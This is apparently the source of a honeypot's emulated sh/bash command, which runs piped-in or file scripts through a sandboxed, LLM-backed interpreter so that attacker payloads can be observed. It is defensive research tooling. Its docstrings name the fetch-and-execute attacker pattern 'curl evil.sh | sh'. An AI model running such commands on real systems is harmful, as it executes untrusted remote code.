"""sh / bash — run commands from ``-c``, a pipe, or a script file.

Design lineage
--------------
Modelled on Cowrie's ``bash.py`` (one class serving sh and bash). The key trick
is the same: executing a command string means running it through a shell — here,
re-entrantly through the *same* Interpreter via ``ctx.run_line``. That shares
the session's VirtualFS, cwd, memory and — importantly — the LLM ``miss_handler``,
so a pipe like ``curl evil.sh | sh`` keeps working end to end: curl's body flows
into sh, sh runs it, and any unknown command inside still reaches the model.

Why this matters
----------------
``download | sh`` (or ``| bash``) is the canonical attacker move — fetch a
payload and execute it. Without a registered shell, that pipeline died at
``sh: command not found`` and the honeypot lost the chance to observe the
payload. This closes that gap.

Modes (mirroring bash)
----------------------
* ``sh -c "cmds"``        run the string; exit status is the last command's.
* piped input             read stdin as a script, run it (``curl x | sh``).
* ``sh script.sh``        read the file from the VFS and run it.
* bare ``sh`` (no input)  interactive sub-shell is **not** entered (that needs a
                          read_line loop; deferred) — behave like EOF, exit 0.

Deferred
--------
Interactive sub-shell prompt; job control; ``$?``-from-parent nuance. Script
execution is line-oriented (no multi-line constructs like here-docs / loops).
"""

from __future__ import annotations

from honeyshell.commands.base import Command
from honeyshell.commands.registry import register

__all__ = ["Sh"]

#: Max nesting of the sh/bash builtin. Deep enough for realistic installers
#: (a script that calls a script), shallow enough to stop runaway recursion and
#: cap the LLM fan-out a single ``curl x | sh`` can trigger.
_MAX_SHELL_DEPTH = 8


@register("sh", "/bin/sh", "bash", "/bin/bash", "dash", "/bin/dash")
class Sh(Command):
    async def run(self) -> int:
        args = self.args

        # sh -c "cmds"
        if args and args[0] == "-c":
            script = " ".join(args[1:])
            script = _strip_matched_quotes(script)
            return await self._run_script(script)

        # Piped-in script: `curl x | sh`. read_all() returns "" when stdin is
        # a NullReader (no pipe), so this only fires with real piped data.
        piped = await self.read_all()
        if piped:
            return await self._run_script(piped)

        # sh script.sh
        if args and not args[0].startswith("-"):
            return await self._run_file(args[0])

        # Bare `sh` with no input: don't spawn an interactive prompt (deferred);
        # behave like an immediate EOF.
        return 0

    async def _run_file(self, filename: str) -> int:
        try:
            text = self.ctx.fs.readtext(filename, self.ctx.cwd)
        except Exception:
            # bash reports missing and unreadable the same way here.
            self.errline(f"{self.prog}: {filename}: No such file or directory")
            return 127
        return await self._run_script(text)

    async def _run_script(self, script: str) -> int:
        """Run each non-empty line through the same interpreter.

        Output is redirected to this command's stdout/stderr so it surfaces on
        sh's own streams (e.g. the tail of a ``curl x | sh`` pipeline).

        Two guards keep a sub-shell from leaking into the login session:

        * **exit isolation.** A script that runs ``exit``/``logout`` sets
          ``ctx.should_exit`` — but that must only end *this* sub-shell, not the
          attacker's whole session. We snapshot the flag, and if the script
          tripped it we consume it (stop running further lines) and restore the
          outer value, exactly like a real ``sh -c`` / ``curl | sh``.
        * **depth guard.** Nested shells (an LLM-generated installer that pipes
          into sh, or a self-referential script) are capped so they can't spin
          forever or fan out into an unbounded storm of LLM calls.
        """
        if self.ctx.run_line is None:
            # No live interpreter wired (e.g. a bare unit-test context). Nothing
            # we can safely execute; fail closed rather than pretend.
            return 0
        if self.ctx.shell_depth >= _MAX_SHELL_DEPTH:
            self.errline(f"{self.prog}: maximum shell nesting exceeded")
            return 1

        outer_should_exit = self.ctx.should_exit
        outer_cwd = self.ctx.cwd
        self.ctx.should_exit = False
        self.ctx.shell_depth += 1
        status = 0
        try:
            for raw in script.splitlines():
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                status = await self.ctx.run_line(
                    line, stdout=self.stdout, stderr=self.stderr
                )
                # A sub-shell ``exit``/``logout`` ends this script only.
                if self.ctx.should_exit:
                    break
        finally:
            self.ctx.shell_depth -= 1
            # Restore the outer session's flag and working directory: a
            # sub-shell's ``exit`` and ``cd`` are contained here and must not
            # leak into the login session (``curl x | sh`` that cd's into
            # $(mktemp -d) should NOT strand the attacker's prompt there).
            self.ctx.should_exit = outer_should_exit
            self.ctx.cwd = outer_cwd
        return status


def _strip_matched_quotes(s: str) -> str:
    """Drop one layer of matching outer quotes, as bash does for ``-c 'x'``.

    Only strips when the whole string is wrapped (``'...'`` or ``"..."``); a
    string like ``echo "a" "b"`` is left intact.
    """
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ("'", '"'):
        return s[1:-1]
    return s
